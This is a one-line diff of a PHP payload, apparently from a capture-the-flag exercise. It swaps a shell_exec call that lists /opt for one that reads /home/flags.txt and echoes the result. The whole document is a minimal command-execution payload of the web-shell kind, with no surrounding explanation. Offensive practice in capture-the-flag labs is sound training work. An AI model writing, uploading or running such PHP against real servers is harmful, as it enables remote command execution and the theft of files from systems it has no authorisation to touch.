@@ -1,1 +1,1 @@
-<?php echo shell_exec('ls /opt'); ?>
+<?php echo shell_exec('cat /home/flags.txt'); ?>
